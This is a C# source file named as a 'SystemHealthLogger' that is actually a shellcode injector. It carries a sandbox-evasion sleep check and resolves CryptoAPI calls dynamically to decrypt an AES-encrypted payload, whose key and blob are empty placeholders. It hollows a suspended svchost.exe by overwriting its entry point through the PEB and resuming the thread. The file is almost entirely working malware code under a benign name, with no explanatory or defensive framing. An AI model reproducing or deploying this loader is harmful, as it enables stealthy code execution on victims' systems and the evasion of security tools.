using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public static class NativeMethods
{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
}


namespace SystemHealthLogger
{
    public class MainController
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct S1 { public Int32 cb; public IntPtr a, b, c; public Int32 x, y, w, h, ccX, ccY, fa, f; public Int16 s, r; public IntPtr d, i, o, e; }

        [StructLayout(LayoutKind.Sequential)]
        internal struct S2
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct S3 { public IntPtr a, b, c, d, e, f; }

        static bool F1(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, ref S1 i, out S2 j)
        {
            return CreateProcess(a, b, c, d, e, f, g, h, ref i, out j);
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref S1 lpStartupInfo,
            out S2 lpProcessInformation);

        static int F2(IntPtr a, int b, ref S3 c, uint d, ref uint e)
        {
            return ZwQueryInformationProcess(a, b, ref c, d, ref e);
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref S3 procInformation, uint ProcInfoLen, ref uint retlen);

        static bool F3(IntPtr a, IntPtr b, byte[] c, int d, out IntPtr e)
        {
            return ReadProcessMemory(a, b, c, d, out e);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);

        static bool F4(IntPtr a, IntPtr b, byte[] c, Int32 d, out IntPtr e)
        {
            return WriteProcessMemory(a, b, c, d, out e);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static uint F5(IntPtr a)
        {
            return ResumeThread(a);
        }

        static IntPtr F7(string lib) => NativeMethods.LoadLibrary(lib);
        static IntPtr F8(IntPtr mod, string fn) => NativeMethods.GetProcAddress(mod, fn);

        public delegate bool D1(ref IntPtr a, string b, string c, uint d, uint e);
        public delegate bool D2(IntPtr a, uint b, IntPtr c, uint d, ref IntPtr e);
        public delegate bool D3(IntPtr a, byte[] b, int c, uint d);
        public delegate bool D4(IntPtr a, uint b, IntPtr c, uint d, ref IntPtr e);
        public delegate bool D5(IntPtr a, IntPtr b, bool c, uint d, byte[] e, ref int f);
        public delegate bool D6(IntPtr a);
        public delegate bool D7(IntPtr a);
        public delegate bool D8(IntPtr a, uint b);

        static T G<T>(string x, string y) where T : Delegate
        {
            IntPtr z = F7(x);
            IntPtr f = F8(z, y);
            return Marshal.GetDelegateForFunctionPointer<T>(f);
        }

        static void HideMe()
        {
            var r = new Random();
            uint ms = (uint)r.Next(15000, 30000);
            DateTime t = DateTime.Now;
            System.Threading.Thread.Sleep((int)ms);
            if ((DateTime.Now - t).TotalMilliseconds < ms * 0.8)
                Environment.Exit(0);
        }

        static byte[] D(byte[] ed, byte[] k)
        {
            IntPtr p = IntPtr.Zero, h = IntPtr.Zero, ky = IntPtr.Zero;
            int len = ed.Length;
            byte[] df = new byte[len];
            Buffer.BlockCopy(ed, 0, df, 0, len);

            var c1 = G<D1>("advapi32.dll", "CryptAcquireContextA");
            var c2 = G<D2>("advapi32.dll", "CryptCreateHash");
            var c3 = G<D3>("advapi32.dll", "CryptHashData");
            var c4 = G<D4>("advapi32.dll", "CryptDeriveKey");
            var c5 = G<D5>("advapi32.dll", "CryptDecrypt");
            var c6 = G<D6>("advapi32.dll", "CryptDestroyKey");
            var c7 = G<D7>("advapi32.dll", "CryptDestroyHash");
            var c8 = G<D8>("advapi32.dll", "CryptReleaseContext");

            try
            {
                if (!c1(ref p, null, null, 24, 0xF0000000)) throw new Exception("Fail A");
                if (!c2(p, 0x800C, IntPtr.Zero, 0, ref h)) throw new Exception("Fail B");
                if (!c3(h, k, k.Length, 0)) throw new Exception("Fail C");
                if (!c4(p, 0x6610, h, 0, ref ky)) throw new Exception("Fail D");
                if (!c5(ky, IntPtr.Zero, true, 0, df, ref len)) throw new Exception("Fail E");

                byte[] f = new byte[len];
                Array.Copy(df, f, len);
                return f;
            }
            finally
            {
                if (ky != IntPtr.Zero) c6(ky);
                if (h != IntPtr.Zero) c7(h);
                if (p != IntPtr.Zero) c8(p, 0);
            }
        }

        [System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
        public static void Main(string[] x)
        {
            HideMe();

            string a = "";
            string b = "";

            byte[] ka = Convert.FromBase64String(a);
            byte[] enc = Convert.FromBase64String(b);
            byte[] sc = D(enc, ka);

            S1 si = new S1();
            S2 pi = new S2();

            if (!F1(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) return;

            S3 bi = new S3();
            uint temp = 0;
            IntPtr hProc = pi.hProcess;
            F2(hProc, 0, ref bi, (uint)(IntPtr.Size * 6), ref temp);
            IntPtr ptr = (IntPtr)((long)bi.b + 0x10);

            byte[] ab = new byte[IntPtr.Size];
            F3(hProc, ptr, ab, ab.Length, out _);
            IntPtr imgBase = (IntPtr)(BitConverter.ToInt64(ab, 0));

            byte[] hdr = new byte[0x200];
            F3(hProc, imgBase, hdr, hdr.Length, out _);

            uint elf = BitConverter.ToUInt32(hdr, 0x3C);
            uint ep = BitConverter.ToUInt32(hdr, (int)(elf + 0x28));
            IntPtr addr = (IntPtr)(ep + (ulong)imgBase);

            F4(hProc, addr, sc, sc.Length, out _);
            F5(pi.hThread);
        }
    }
}
